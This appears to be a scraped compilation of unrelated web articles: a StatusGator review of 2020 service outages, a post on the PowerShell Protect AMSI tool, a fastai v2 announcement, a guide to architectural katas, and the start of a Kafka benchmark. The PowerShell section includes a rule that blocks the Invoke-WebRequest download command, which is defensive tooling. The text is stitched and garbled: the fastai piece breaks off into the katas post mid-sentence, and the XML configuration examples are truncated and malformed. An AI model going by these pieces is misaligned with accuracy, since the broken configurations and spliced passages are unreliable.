<p>Zoom usage has gone up dramatically since the Coronavirus pandemic began as more people work and study remotely. So have subscriptions to the Zoom status page, which have skyrocketed in StatusGator since April.&nbsp;</p>
<figure><img src="https://lh4.googleusercontent.com/2sgE3LGne0_xP2m3OP2ekivYBcg0PAOYeLqKRhTfEHZH6obapJBvPpiDy-1aYNSeaTUbgl220ZStj5_YWrayRzGfOvY6Uqt1WOLd4qQRDYTZAYgWcYAmqmLkoCOJvbQhTmRmswLA" alt=""></figure>
<p>Aside from businesses being forced to begin working remotely, many churches and other public organizations started using Zoom to hold Sunday masses, meetings, and to host public events. Thus, while Sunday is not a business day, many paid accounts in the UK quickly noticed that they were not able to host or join Zoom meetings (free accounts seemed not to be affected). The issue was reported through multiple channels, including Twitter and StatusGator that monitors the status of Zoom.</p>
<p>A Zoom spokesperson responded, acknowledging awareness of the situation and mentioning it was only affecting a subset of users. However, we all know a subset might be 1% or 99% and Zoom provided no indication whatsoever as to the volume of users affected. Providing more transparency into the percentage of affected users is a hallmark of a quality status page, something Zoom should improve.</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Hi there – We have received reports that Zoom users may be experiencing issues hosting and joining meetings. Please see <a href="https://t.co/aqz5nS7fZY" data-wpel-link="external" target="_blank" rel="nofollow">https://t.co/aqz5nS7fZY</a> for updates.</p>— Zoom (@zoom_us) <a href="https://twitter.com/zoom_us/status/1262025037999214595?ref_src=twsrc%5Etfw" data-wpel-link="external" target="_blank" rel="nofollow">May 17, 2020</a></blockquote>
</div></figure>
<p>The issue was reported resolved by 11:40 AM EDT, but Zoom provided no explanation or postmortem of any kind. Such an attitude, along with <a aria-label="undefined (opens in a new tab)" href="https://www.theverge.com/2020/3/27/21197090/zoombombing-zoom-stop-how-to-porn-trolls-video-chat-screen-sharing" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">Zoombombing</a> and a “Company Directory” checkbox in settings allowing users to <a aria-label="undefined (opens in a new tab)" href="https://www.theverge.com/2020/3/31/21201956/zoom-leak-user-information-email-addresses-photos-contacts-directory" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">leak corporate photos and emails</a> is one of the reasons many users are now actively seeking better alternatives to Zoom.</p>
<h2>Outage #3 – <strong>GitHub was inaccessible… Again. June 29, 2020</strong></h2>
<p>GitHub seems to be down a lot more since its $7.5 billion <a aria-label="undefined (opens in a new tab)" href="https://blogs.microsoft.com/blog/2018/10/26/microsoft-completes-github-acquisition/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">acquisition by Microsoft</a>. The reasons have not been disclosed, and we can only speculate on the causes. Maybe it has something to do with integrating GitHub infrastructure with Microsoft systems. Maybe it’s because GitHub has been moving faster and adding more features. In any case, it’s been almost two years since the acquisition, and users are noticing more sustained periods of downtime at GitHub. Our independent <a aria-label="undefined (opens in a new tab)" href="https://statusgator.com/blog/2020/06/04/has-github-been-down-more-since-its-acquisition-by-microsoft/" target="_blank" rel="noreferrer noopener follow" data-wpel-link="internal">analysis of the GitHub status page</a> confirms that the outages became more frequent over the past two years.</p>
<p>Microsoft is working hard to turn GitHub into an even better place for developers than it was before. The Redmond giant made all of the paid plans more affordable earlier this year and offered some key features for free to place more tools at the disposal of IT professionals. Microsoft, Apple, AWS, Google, Facebook and thousands of other companies use GitHub to store and run their code repositories, so its uptime is of utmost importance.</p>
<p>Nevertheless, GitHub was down for two hours on June 29, 2020. The entire website and its services were inaccessible, so many developers were not even able to push code or deploy their apps due to the number of GitHub integrations that were unresponsive. Naturally, this caused a major backlash and caused <a aria-label="undefined (opens in a new tab)" href="https://github.blog/2020-07-08-introducing-the-github-availability-report/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">GitHub to introduce a monthly availability report</a> in addition to its status page, providing detailed explanations of the reasons and outcomes of every outage.&nbsp;&nbsp;</p>
<h2>Outage #4 – <strong>IBM Cloud went down along with the status page, June 10, 2020</strong></h2>
<p>One of the biggest mistakes any cloud-based service can do is to host its status page on its own infrastructure. It appears IBM Cloud did just that, so when its whole infrastructure became inaccessible for several hours in June, its status page followed suit. We could have expected IBM to draw some conclusions after the <a href="https://www.datacenterdynamics.com/en/news/ibm-cloud-struggles-suffers-small-outage-dallas/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener nofollow" data-wpel-link="external">Dallas downtime this March</a>, but, apparently, they did not bother, or did not make enough effort.</p>
<p>Thus, on June 10, 2020, the IBM Cloud infrastructure went down globally. This outage rendered features like Watson AI, IBM Cloud Foundry, Kubernetes Service, Cloud Object Storage, Identity Access and Management, VPN for VPS, App Connect and others completely inaccessible. Fortunately, the IBM Cloud status page was unavailable only in the early stages of the outage and became available intermittently later. That’s why StatusGator was still able to send alerts to users who had subscribed to the IBM Cloud status page.</p>
<p>The company totally failed to communicate the reasons for the outage, as well as the steps it took to alleviate the impact. It later became known from an independent monitoring service, that a 3rd-party network provider had extensively used the traffic routes, which resulted in severe constraints on the IBM Cloud configuration bandwidth. IBM specialists reconfigured their systems and restored operations, but no official explanations or announcements ensued — much to the disappointment of users.&nbsp;</p>
<p>It is not the first time IBM has failed at public relations, nor, we think, will it be the last. This is probably one of the reasons for them to fall so far behind AWS, Google Cloud Platform, Microsoft Azure, and other cloud providers, despite delivering a diverse range of competitive cloud services.</p>
<p>But what could IBM have done? Had an independent status page, naturally! Below are just some of the variants they could have used:</p>
<ol><li><a aria-label="undefined (opens in a new tab)" href="https://statuspage.io/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">StatusPage.io</a>. The largest and most popular platform around. This is probably the only provider big enough to handle companies like IBM Cloud.</li><li><a aria-label="undefined (opens in a new tab)" href="https://status.io/" target="_blank" rel="noreferrer noopener nofollow" data-wpel-link="external">Status.io</a>. Another large and widely used status page provider with infrastructure meeting the scale that IBM Cloud would require.&nbsp;</li><li>Alternatively, they could build their own status page, being careful <a href="https://statusgator.com/blog/2020/04/21/your-status-page-deserves-its-own-domain/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener follow" data-wpel-link="internal">not to be dependent on any of their own infrastructure</a>. IBM could host it as a static page on a third-party CDN to reduce complexity and dependency on its network.</li></ol>

<h2>Outage #5 – <strong>T-Mobile Flushes Its Network Down the Drain, June 15, 2020</strong></h2>
<p>T-Mobile, one of the largest mobile network operators in the US, the EU and the UK, recently found itself amid a perfect storm, when it failed to provide voice and text messaging for 13 hours straight across the US. …</p></div></article></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" role="main"><div><h2>Audit and block PowerShell with PowerShell Protect</h2><h4>August 1, 2020</h4><p><a href="https://www.powershellprotect.com/">PowerShell Protect</a> is a new product from <a href="https://www.ironmansoftare.com/">Ironman Software</a> that allows you to audit and block scripts in any PowerShell host on Windows.</p><p>You can <a href="https://www.powershellgallery.com/packages/powershellprotect">download</a> and try PowerShell Protect for 30 days right now.</p><h2 id="how-powershell-protect-works">How PowerShell Protect works</h2><p>PowerShell Protect is an <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">Antimalware Scan Interface</a> provider. Once it is registered with the operating system it will scan all PowerShell scripts that are executed on the machine.</p><p>PowerShell Protect is highly configurable via XML files to provide the ability to filter the scripts that are audited and blocked. You can use filters such as command, content, path, domain controller status and administrator access.</p><p>If a filter is matched you can configure both auditing and blocking. When auditing is enabled, you can send event information to a file, a TCP port or an HTTP server. If blocking is enabled, the matched script will be prevented from running.</p><h2 id="installing-powershell-protect">Installing PowerShell Protect</h2><p>PowerShell Protect is distributed as a PowerShell module. You can download it by using <code>Install-Module</code>.</p><pre><code>Install-Module PowerShellProtect
</code></pre><p>Once you have the module installed, you can use the <code>Install-PowerShellProtect</code> to register the PowerShell Protect AMSI provider. You will need administrative permissions to install the provider. PowerShell Protect is supported on Windows 10 and above as well as Windows Server 2016 and above.</p><h2 id="creating-a-filtering-rule">Creating a filtering rule</h2><p>There are numerous properties that you can use to define filters for PowerShell protect rules. Some of these properties include script content, PowerShell command, administrative permissions, domain controller status and domain name. For a full list of properties, visit our <a href="https://docs.powershellprotect.com/rules#properties">documentation</a>.</p><p>PowerShell Protect is configured using an XML file. There are several places you can use to configure the system. The easiest to use when developing rules is by create a configuration file in <code>%ProgramData%\PowerShellProtect\config.xml</code>. For other options, visit out <a href="https://docs.powershellprotect.com/configuration">documentation</a>.</p><p>Rules are made up of a series of conditions. For the rule to match, all the conditions must be met. Each condition checks a property of the script’s execution context. You can use various <a href="https://docs.powershellprotect.com/rules#operators">operators</a> to match the value you wish. These include expressions like equals, not equals, contains, and even regular expressions.</p><p>The below example will match conditions will match the <code>Invoke-WebRequest</code> command. Matching is case-insensitive.</p><pre><code>&lt;Conditions&gt;
    &lt;Condition&gt;
        &lt;Property&gt;command&lt;/Property&gt;
        &lt;Operator&gt;contains&lt;/Operator&gt;
        &lt;Value&gt;invoke-webrequest&lt;/Value&gt;
    &lt;/Condition&gt;
&lt;/Conditions&gt;
</code></pre><h3 id="taking-action-based-on-a-rule">Taking action based on a rule</h3><p>When a rule matches, you can assign one or more actions to take place. The available actions are auditing to a file, TCP or HTTP server and blocking.</p><p>The first step is to define the available actions and settings for the type of action you wish to take. This allows you to use the action for multiple rules.</p><p>The following example configurations actions for auditing to the <code>%temp%\test.txt</code> file using a custom format and blocking. The name is used when referencing the action within the rule.</p><pre><code>&lt;Actions&gt;
    &lt;Action&gt;
        &lt;Name&gt;File&lt;/Name&gt;
        &lt;Type&gt;File&lt;/Type&gt;

        &lt;Type&gt;Block&lt;/Type&gt;
    &lt;/Action&gt;
&lt;/Actions&gt;
</code></pre><p>To assign an action to a rule, you can use the <code>Action</code> and <code>ActionRef</code> nodes.</p><pre><code>&lt;Actions&gt;
    &lt;ActionRef&gt;
        &lt;Name&gt;File&lt;/Name&gt;

&lt;/Configuration&gt;
</code></pre><p>Once the file has been created, you can immediately see the results of configuration by executing a command in PowerShell.exe. Since blocking is enabled, you will receive an error if you try to run <code>Invoke-WebRequest</code>. You will also see an audit log created in the temp folder.</p><p><img src="https://www.powershellprotect.com/assets/img/screenshot.png" alt=""></p><h2 id="supported-scenarios">Supported Scenarios</h2><p>As mention earlier, AMSI providers, like PowerShell Protect, require Windows 10 and Windows Server 2016 or later.</p><p>In addition to PowerShell.exe and Pwsh.exe, PowerShell Protect will work in any PowerShell host. This means that anything that is hosting and running PowerShell is still protected. You can use the <code>ApplicationName</code> property when creating rules to adjust the rule based on the PowerShell host. The application name property includes the full path to the host.</p><p>Additionally, you will have access to some properties that provide context of the account and environment executing the script. You’ll be able to adjust rules for domain name, user name, domain controller status and admin status.</p><h2 id="download-now">Download now!</h2><p>PowerShell Protect is free to try for 30 days. You can <a href="https://powershellgallery.com/packages/PowerShellProtect">download</a> it now from the PowerShell Gallery.</p></div></div></div>]]>

<h2 id="fastai-v2">fastai v2</h2>

<p>fastai is a deep learning library which provides practitioners with high-level components that can quickly and easily provide state-of-the-art results in standard deep learning domains, and provides researchers with low-level components that can be mixed and matched to build new approaches. It aims to do both things without substantial compromises in ease of use, flexibility, or performance. This is possible thanks to a carefully layered architecture, which expresses common underlying patterns of many deep learning and data processing techniques in terms of decoupled abstractions. These abstractions can be expressed concisely and clearly by leveraging the dynamism of the underlying Python language and the flexibility of the PyTorch library. fastai includes:</p>

<ul>
  <li>A new type dispatch system for Python along with a semantic type hierarchy for tensors</li>
  <li>A GPU-optimized computer vision library which can be extended in pure Python</li>
  <li>An optimizer which refactors out the common functionality of modern optimizers into two basic pieces, allowing optimization algorithms to be implemented in 45 lines of code</li>
  <li>A novel 2-way callback system that can access any part of the data, model, or optimizer and change it at any point during training</li>
  <li>A new data block API</li>
  <li>And much more…</li>
</ul>

<p>fastai is organized around two main design goals: to be approachable and rapidly productive, while also being deeply hackable and configurable. It is built on top of a hierarchy of lower-level APIs which provide composable building blocks. This way, a user wanting to rewrite part of the high-level API or add particular behavior to suit their needs does not have to learn how to use the lowest level.</p>

<p>To see what’s possible with fastai, take a look at the <a href="https://docs.fast.ai/quick_start.html">Quick Start</a>, which shows how to use around 5 lines of code to build an image classifier, an image segmentation model, a text sentiment model, a recommendation system, and a tabular model. For each of the applications, the code is much the same.</p>

<p>Read through the <a href="https://docs.fast.ai/tutorial">Tutorials</a> to learn how to train your own models on your own datasets. Use the navigation sidebar to look through the fastai documentation. Every class, function, and method is documented here. To learn about the design and motivation of the library, read the <a href="https://www.mdpi.com/2078-2489/11/2/108/htm">peer reviewed paper</a>, or watch <a href="https://youtu.be/bHVqO5YyNbU">this presentation</a> summarizing some of the key design points.</p>

<p>All fast.ai projects, including fastai, are built with <a href="https://nbdev.fast.ai/">nbdev</a>, which is a full <a href="https://www.fast.ai/2019/12/02/nbdev/">literate programming environment</a> built on Jupyter Notebooks. That means that every piece of documentation can be accessed as interactive Jupyter notebooks, and every documentation page includes a link to open it directly on Google Colab to allow for experimentation and customization.</p>

<p>It’s very easy to migrate from plain PyTorch, Ignite, or any other PyTorch-based library, or even to use fastai in conjunction with other libraries. Generally, you’ll be able to use all your existing data processing code, but will be able to reduce the amount of code you require for training, and more easily take advantage of modern best practices. Here are migration guides from some popular libraries to help you on your way: <a href="https://docs.fast.ai/migrating_pytorch">Plain PyTorch</a>; <a href="https://docs.fast.ai/migrating_ignite">Ignite</a>; <a href="https://docs.fast.ai/migrating_lightning">Lightning</a>; <a href="https://docs.fast.ai/migrating_catalyst">Catalyst</a>. And because it’s easy to combine and part of the fastai framework with your existing code and libraries, you can just pick the bits you want. For instance, you could use fastai’s GPU-accelerated computer vision library, along with your own training loop.</p>

<p>fastai includes many modules that add functionality, generally through callbacks. Thanks to the flexible infrastructure, these all work together, so you can pick and choose what you need (and add your own), including: <a href="https://arxiv.org/abs/1710.09412">mixup</a> and <a href="https://arxiv.org/abs/1708.04552">cutout</a> augmentation, a uniquely flexible <a href="https://docs.fast.ai/vision.gan.html">GAN training</a> framework, a range of schedulers (many of which aren’t available in any other framework) including support for fine tuning following the approach described in <a href="https://arxiv.org/abs/1801.06146">ULMFiT</a>, mixed precision, gradient accumulation, support for a range of logging frameworks like Tensorboard (with particularly strong support for Weights and Biases, as <a href="https://app.wandb.ai/borisd13/demo_config/reports/Visualize-track-compare-Fastai-models--Vmlldzo4MzAyNA">demonstrated here</a>), <a href="http://docs.fast.ai/medical.imaging">medical imaging</a>, and much more. Other functionality is added through the <a href="https://github.com/nestordemeure/fastai-extensions-repository">fastai ecosystem</a>, such as support for <a href="https://ohmeow.github.io/blurr/">HuggingFace Transformers</a> (which can also be done manually, as shown in <a href="http://docs.fast.ai/tutorial.transformers">this tutorial</a>), <a href="https://github.com/rbracco/fastai2_audio">audio</a>, <a href="https://muellerzr.github.io/fastinference/inference/">accelerated inference</a>, and so forth.</p>

<p>There’s already some great learning material made available for fastai v2 by the community, such as the “Zero to Hero” series by Zach Mueller: <a href="https://muellerzr.github.io/fastblog/2020/08/20/_08_21-beginner.html">part 1</a>; <a href="https://muellerzr.github.io/fastblog/2020/08/20/_08_21-intermediate.html">part 2</a>.</p>

<h2 id="practical-deep-learning-for-coders-the-course">Practical Deep Learning for Coders, the course</h2>

<p>Previous fast.ai courses have been studied by hundreds of thousands of students, from all walks of life, from all parts of the world. Many students have told us about how they’ve become <a href="https://forums.fast.ai/t/my-first-gold-medal/54237">multiple gold medal winners</a> of <a href="https://towardsdatascience.com/my-3-year-journey-from-zero-python-to-deep-learning-competition-master-6605c188eec7">international machine learning competitions</a>, <a href="https://forums.fast.ai/t/how-has-your-journey-been-so-far-learners/6480/2">received offers</a> from top companies, and <a href="https://icml-compbio.github.io/2020/papers/WCBICML2020_paper_67.pdf">having</a> <a href="https://ui.adsabs.harvard.edu/abs/2020EGUGA..2221465A/abstract">research</a> <a href="https://arxiv.org/pdf/2004.14356.pdf">papers</a> <a href="https://pubs.rsna.org/doi/abs/10.1148/ryai.2019190113?journalCode=ai">published</a>. For instance, Isaac Dimitrovsky <a href="https://forums.fast.ai/t/thanks-ra2-dream-challenge-win/76875">told us</a> that he had “<em>been playing around with ML for a couple of years without really grokking it… [then] went through the fast.ai part 1 course late last year, and it clicked for me</em>”. He went on to achieve first place in the prestigious international <a href="https://www.synapse.org/#!Synapse:syn20545111/wiki/594083">RA2-DREAM Challenge</a> competition! He developed a <a href="https://www.synapse.org/#!Synapse:syn21478998/wiki/604432">multistage deep learning method</a> for scoring radiographic hand and foot joint damage in rheumatoid arthritis, taking advantage of the fastai library.</p>

<p><a href="https://course.fast.ai/">This year’s course</a> takes things even further. It incorporates both machine learning and deep learning in a single course, covering topics like random forests, gradient boosting, test and validation sets, and p values, which previously were in a separate machine learning course. In addition, production and deployment are also covered, including material on developing a web-based GUI for our own deep learning powered apps. The only prerequisite is high-school math, and a year of coding experience (preferably in Python). The course was recorded live, in conjunction with the <a href="https://www.usfca.edu/data-institute">Data Institute</a> at the University of San Francisco.</p>

<p>After finishing this course you will know:</p>

<ul>
  <li>How to train models that achieve state-of-the-art results in:
    <ul>
      <li>Computer vision, including image classification (e.g.,classifying pet photos by breed), and image localization and detection (e.g.,finding where the animals in an image are)</li>
      <li>Natural language processing (NLP), including document classification (e.g.,movie review sentiment analysis) and language modeling</li>
      <li>Tabular data (e.g.,sales prediction) with categorical data, continuous data, and mixed data, including time series</li>
      <li>Collaborative filtering (e.g.,movie recommendation)</li>
    </ul>
  </li>
  <li>How to turn your models into web applications, and deploy them</li>
  <li>Why and how deep learning models work, and how to use that knowledge to improve the accuracy, speed, and reliability of your models</li>
  <li>The latest deep learning techniques that really matter in practice</li>
  <li>How to implement stochastic gradient descent and a complete training loop from scratch</li>
  <li>How to think about the ethical implications of your work, to help ensure that you’re making the world a better place and that your work isn’t misused for harm</li>
</ul>

<p>We care a lot about teaching, using a <a href="https://www.fast.ai/2016/10/08/teaching-philosophy/">whole game</a> approach. In this course, we start by showing how to use a complete, working, very usable, state-of-the-art deep learning network to solve real-world problems, using simple, expressive tools. And then we gradually dig deeper and deeper into understanding how those tools are made, and how the tools that make those tools are made, and so on. We always teach through examples. We ensure that there is a context and a purpose that you can understand intuitively, rather than starting with algebraic symbol manipulation. We also dive right into the details, showing you how to build all the components of a deep learning model from scratch, including discussing performance and optimization details.</p>

<p>The whole course can be completed for free without any installation, by taking advantage of the guides for the Colab and Gradient platforms, which provide free, GPU-powered Notebooks.</p>

<p>To understand what the new book is about, and who it’s for, let’s see what others have said about it… Soumith Chintala, the co-creator of PyTorch, said in <a href="https://www.fast.ai/2020/08/20/soumith-forward/">the foreword</a> to  <a href="https://www.amazon.com/Deep-Learning-Coders-fastai-PyTorch/dp/1492045527">Deep Learning for Coders with fastai and PyTorch</a>:</p>

<p>Architectural katas are a great way to spice up the architectural skills of your team or community, and practice to have productive discussions about architecture.</p>

<p>I always receive great feedback after (co)-organizing architectural katas <sup id="fnref:1"><a href="#fn:1">1</a></sup> and I regularly get questions on organizing them with others.  So with Matteo Pierro, I did run a session at XP-days Benelux 2019 on how you can organize these katas yourself, sharing experiences to encourage others organizing the same kind of katas.</p>



<p>Ivory tower architects defining the architecture for your team are from a bygone era. The general trend is that development <em>teams define their software architecture</em>, or at least that teams are strongly involved in defining the architecture.</p>

<p>But people cannot learn architecture well out of thin air, they need a way to learn and practice. This was also the main motivation of <a href="https://nelis.boucke.be/post/architectural-katas/1" title="Thanks to [Erik Talboom](https://twitter.com/talboomerik), [Michel Daviot](https://twitter.com/tyrcho) and [Matteo Pierro](https://twitter.com/matteo_pierro) for co-organising some of the architectural katas.

<p>“How do we get great designers? Great designers design, of course.”
Fred Brooks</p>

<p>”So how are we supposed to get great architects, if they only get the chance  to architect fewer than a half-dozen times in their career?”
Ted Neward</p>
</blockquote>

<p>Ted was searching for a way to practice defining architectures and, inspiration by <a href="http://codekata.com/" title="Code katas">code katas</a>, came up with the concept of architectural katas.</p>

<p>Architectural katas are a workshop were several small groups (3-5 people) practice discussing and designing architectures. Typically the workshop involves several iterations.</p>

<p>At the start of an iteration, each group gets a project description and some constraints, and gets some time to discover what is needed, ask clarifying questions to the “customer” (often the facilitator), discusses technology options, and design a vision for the architecture.</p>

<p>After discussing for a while, each group presents their results to the other groups to gather feedback. The iteration ends with some reflection and a break.</p>

<p>For more information, check out the <a href="http://www.architecturalkatas.com/about.html" title="About architectural katas">description on the architectural kata website</a>.</p>



<p>Organizing a good workshop asks for proper preparation and facilitation. It might look daunting at first, but I hope the next sections can help you on your way.</p>

<p>The learnings in this post are extracted from organizing events like this over 2 years, from evening meetups, conference sessions, open full-day sessions till closed company sessions. The audience for those sessions varied between 10 people and 40 people.</p>

<h3 id="who-to-invite">Who to invite?</h3>

<p>You can invite any team members or people in the community interested in discussing the architecture. This includes, but is not limited to, developers, testers, product owners, analysts, scrum masters, architects … It helps if the majority of the people have software development experience or affinity, but it is not a strict requirement for all participants.</p>

<p>No prior experience as an architect is required. I prefer a mixture of roles and backgrounds to have healthy discussions and to make assumptions explicit.</p>

<h3 id="when">When</h3>

<p>I run architectural katas as a workshop on a meetup, conference or in a company. As far as I understood, Ted did run it as a regular event with the same community.</p>

<h3 id="what-kind-of-environment">What kind of environment?</h3>

<p>Some important aspects of the environment setup are:</p>

<ul>
<li><em>Provide unlimited modeling Space</em>: You need a good modeling space per group. To often, people will stop architecting as soon as the allocated space is full and you might miss out on some nice creativity or discussion. My experience is that very large (magic) whiteboard<sup id="fnref:2"><a href="#fn:2">2</a></sup> trumps a smaller whiteboard, which trumps a Flipchart, which trumps a table with Flipchart paper, which trumps table with smaller size papers.</li>
<li><em>Room</em>: The above requirements for a modeling space in combination with a lot of people discussing in small groups ask for a spacious room (or several rooms). People need space to discuss comfortable and the noise level must remain acceptable so people can understand each other. For larger workshops with more than 4 groups, I prefer to use several break-out rooms.</li>
<li><em>Materials</em>: Bring enough post-its of several sizes and forms, papers, good whiteboard, and permanent markers.<br></li>
<li><em>Food / drinks</em>: These types of workshops can be very exhausting, especially if you keep on iterating all day long. Catering for sugar dips and the need for drinks helps people to stay focused.</li>
</ul>

<h3 id="projects">Projects?</h3>

<p>Each kata starts from a brief (and intentionally vague and incomplete) project description. Ted Neward did the effort to set up a website to gather and share these project descriptions on <a href="https://nelis.boucke.be/post/architectural-katas/2" title="[Magic whiteboard](https://www.magicwhiteboard.co.uk/) seems to stick very well.
">http://www.architecturalkatas.com/</a>.</p>

<p>Although the Ted talks about drawing a random kata for each group until now I always preselected the project and asked all groups to do the same project. My main motivation is to allow for a more efficient exchange in the feedback and reflection phase.</p>

<p>When selecting a kata it is important to think about your audience. Are they completely new to the format? Are there people with an architectural background in the groups? Do they know about embedded development?  Some challenges are a lot more complex to break into than others or require specialized knowledge your audience might not have.</p>

<p>I like the “Room with a View” as starter kata, as most people have been in contact with hotels and thus have a basic knowledge of the domain.</p>

<blockquote>
<h2 id="room-with-a-view">Room With A View</h2>

<p>A large hotel reservation company wants to build the next generation hotel reservation and management system specifically tailored to high-end resorts and spas where guests can view and reserve specific rooms.</p>

<p>Users: Guests (hundreds), hotel staff (less than 20)</p>

<p>Requirements:</p>

<ul>
<li><p>Registration can be made via web, mobile, phone call, or walk-in.</p></li>

<li><p>Guests have the ability to either book a type of room (standard, deluxe, or suite) or choose a specific room to stay in by viewing pictures of each room and its location in the hotel.</p></li>

<li><p>The system must be able to maintain room status (booked, available, ready to clean, etc.) as well as when the room will be needed next.</p></li>

<li><p>It must also have state-of-the-art housekeeping management functionality so that cleaning and maintenance staff can be directed to various rooms based on priority and reservation need using proprietary devices supplied by the reservation company attached to the cleaning carts.</p></li>

<li><p>Standard reservation functionality (e.g., payments, registration info, etc.) will be done by leveraging the existing reservations system.</p></li>

<li><p>The system will be web-based and hosted by the reservation company.</p></li>
</ul>

<p>Additional Context: ‘Peak season is quickly approaching, so the system must be ready quickly or we have to wait until next year!’; Company is also investing heavily in cutting edge technology like smart room locks that open via a cell phone; Only interested in the high-end market; Sales people have tremendous clout in the organization; people often scramble to make their promises true</p>
</blockquote>

<p>Others I often use in the beginning are ‘Check your work’, ‘Am I Sick’ or ‘All stuff no cruft’.</p>

<p>Another one I always keep around for more challenge is ‘World of web craft’ because it goes beyond a simple website and thus contains a lot more challenges for most people.</p>

<h3 id="additional-constraints">Additional constraints</h3>

<p>Similar to coding katas, I try adding additional constraints to maximize the learning effect and focus on a specific learning goal. For example, you could use a kata to learn a new modeling language or practice. Or through a constraint, you can exaggerate a practice you get it into your muscle memory.</p>

<p>Examples of constraints are:</p>

<ul>
<li>Use the <a href="https://c4model.com/" title="C4 model website">C4 model</a> to document your architectural vision. The C4 model is a simple set of models to visualize the static structure of a software architecture. By giving people a simple and standardized way to visualize their decisions in architectural models, there are suddenly a lot fewer misunderstandings and a more high-quality discussion. I typically use the following flip charts where I add the post-its one by one to introduce the C4 model.</li>
<li>Explicitly try to use only existing cloud services and build nothing.</li>
<li>Use all cloud services.</li>
<li>A component should have only two other components to talk to.</li>
<li>Use event storming to identify the behavior, and update your C4 with this.</li>
</ul>

<p>The constraints might vary in different iterations. For example, I might give no constraint in the first iteration, use C4 as a constraint in the second iteration, use event storming to discover more behavior in the third iteration and finally update the C4 model to represent that behavior.</p>

<h3 id="agenda-and-timing">Agenda and timing</h3>

<p>A typical cycle for a single kata session takes about 1u20 min:</p>

<ul>
<li>10min: Introduction to the kata and the constraints</li>
<li>45min: Team discussion</li>
<li>15min: Review and share architecture</li>
<li>10min: Reflect and share observations</li>
</ul>

<p>I experimented with longer and shorter discussion slots, but 45min seems to be the sweet spot where people are still engaged, but also need a trigger for new ideas. Reviewing, reflecting and starting a new cycle is a perfect way to bring inspiration.</p>

<p>Depending on the amount of time you have, you can repeat the cycle several times. Including a 10 minute break, a cycle then takes 1:30.</p>

<p>Some of the things I did:</p>

<ul>
<li><em>Session of 1h30 to 2h</em>: A single iteration is too short to get a lot of in-depth learning about architecture. I did this several times, but I would only advise running such short sessions to convince people to try this themselves (as was my goal on some conferences and this blogpost). Or maybe if you repeat this weekly it could work, but I never tried.</li>
<li><em>Session between 3h and 4h30</em>: Two to three iterations start to be interesting. People can apply the things they learned during the sharing and reflection in future sessions. If I do only two …</li></ul></article></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Apache Kafka<sup>®</sup> is one of the most popular event streaming systems. There are many ways to <a href="https://www.confluent.io/kafka-vs-pulsar/">compare systems</a> in this space, but one thing everyone cares about is performance. Kafka has been known to be <a href="https://engineering.linkedin.com/kafka/benchmarking-apache-kafka-2-million-writes-second-three-cheap-machines" target="_blank" rel="noopener noreferrer">fast</a>, but how fast is it today, and how does it stack up against other systems? We decided to test Kafka’s performance on the latest cloud hardware to find out.</p>
<p>For comparisons, we chose a traditional message broker, <a href="https://www.rabbitmq.com/" target="_blank" rel="noopener noreferrer">RabbitMQ</a>, and one of the <a href="https://bookkeeper.apache.org/" target="_blank" rel="noopener noreferrer">Apache BookKeeper™</a>&nbsp;based message brokers, <a href="http://pulsar.apache.org/" target="_blank" rel="noopener noreferrer">Apache Pulsar</a>. We focused on (1) <strong>system throughput</strong> and (2) <strong>system latency</strong>, as these are the primary performance metrics for event streaming systems in production. In particular, the throughput test measures how efficient each system is in utilizing the hardware, specifically the disks and the CPU. The latency test measures how close each system is to delivering real-time messaging including tail latencies of up to p99.9th percentile, a key requirement for real-time and mission-critical applications as well as microservices architectures.</p>
<p>We found that Kafka delivers the best throughput while providing the lowest end-to-end latencies up to the p99.9th percentile. At lower throughputs, RabbitMQ delivers messages at very low latencies.</p>

<p>This blog post is structured to first walk you through the benchmarking framework we used, followed by a description of the testbed and the workloads. It will finish with an explanation of the results using the various system and application metrics. All of these are <a href="https://github.com/confluentinc/openmessaging-benchmark/" target="_blank" rel="noopener noreferrer">open source</a>, so curious readers can reproduce the results for themselves or dig deeper into the collected Prometheus metrics. As with most benchmarks, we compare performance on a setup for a specific workload. We always encourage readers to compare using their own workloads/setups, to understand how these translate to production deployments. For a deeper look at features, architecture, ecosystem, and more, read this <a href="https://www.confluent.io/kafka-vs-pulsar/">complete guide</a> comparing Kafka, Pulsar, and RabbitMQ.</p>

<h2 id="background"><a id="background"></a>Background</h2>
<p>First, let’s discuss each of the systems briefly to understand their high-level design and architecture, looking at the trade-offs each system makes.</p>
<p><strong>Kafka</strong> is an open-source distributed event streaming platform, and one of the five most active projects of the Apache Software Foundation. At its core, Kafka is designed as a replicated, distributed, persistent commit log that is used to power event-driven microservices or large-scale stream processing applications. Clients produce or consume events directly to/from a cluster of brokers, which read/write events durably to the underlying file system and also automatically replicate the events synchronously or asynchronously within the cluster for fault tolerance and high availability.</p>
<p><strong>Pulsar</strong> is an open-source distributed pub/sub messaging system originally catered towards queuing use cases. It recently added event streaming functionality as well. Pulsar is designed as a tier of (almost) stateless broker instances that connect to a separate tier of BookKeeper instances, which actually read/write and, optionally, store/replicate the messages durably. Pulsar is not the only system of its kind as there are also other messaging systems like Apache DistributedLog and Pravega, which have been created on top of BookKeeper and aim to also provide some Kafka-like event streaming functionality.</p>
<p><strong>BookKeeper</strong> is an open-source distributed storage service that was originally designed as a write-ahead log for Apache™ Hadoop®’s NameNode. It provides persistent storage of messages in <em>ledgers</em>, across server instances called <em>bookies</em>. Each bookie synchronously writes each message to a local journal log for recovery purposes and then asynchronously into its local indexed ledger storage. Unlike Kafka brokers, bookies do not communicate with each other and it’s the BookKeeper clients that are responsible for replicating the messages across bookies using a quorum-style protocol.</p>
